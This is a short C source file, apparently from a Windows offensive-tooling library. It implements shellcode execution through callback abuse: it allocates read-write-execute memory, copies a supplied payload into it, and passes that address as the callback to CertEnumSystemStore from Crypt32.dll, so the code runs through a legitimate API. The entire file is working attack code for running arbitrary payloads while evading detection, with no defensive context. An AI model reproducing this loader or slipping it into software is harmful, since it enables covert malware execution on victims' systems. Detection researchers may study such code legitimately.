#include "Win32Helper.h"

DWORD UnusedSubroutineDisposeableThread(LPVOID Param)
{
    PSHELLCODE_EXECUTION_INFORMATION Sei = (PSHELLCODE_EXECUTION_INFORMATION)Param;
	CERTENUMSYSTEMSTORE pCertEnumSystemStore = NULL;
	LPVOID BinAddress = NULL;
	HMODULE hModule = NULL;
	BOOL bFlag = FALSE;

	hModule = TryLoadDllMultiMethodW((PWCHAR)L"Crypt32.dll");
	if (!hModule)
		goto EXIT_ROUTINE;

	pCertEnumSystemStore = (CERTENUMSYSTEMSTORE)GetProcAddressA((DWORD64)hModule, "CertEnumSystemStore");
	if (!pCertEnumSystemStore)
		goto EXIT_ROUTINE;

	BinAddress = VirtualAlloc(NULL, Sei->dwLengthOfPayloadInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		goto EXIT_ROUTINE;

	CopyMemoryEx(BinAddress, Sei->Payload, Sei->dwLengthOfPayloadInBytes);

	if (!pCertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)BinAddress))
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hModule)
		FreeLibrary(hModule);

	if (BinAddress)
		VirtualFree(BinAddress, 0, MEM_RELEASE);

	return (bFlag ? 0 : 0xffffffff);
}

BOOL ShellcodeExecViaCertEnumSystemStore(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei)
{
	return CreateThreadAndWaitForCompletion(UnusedSubroutineDisposeableThread, Sei, INFINITE);
}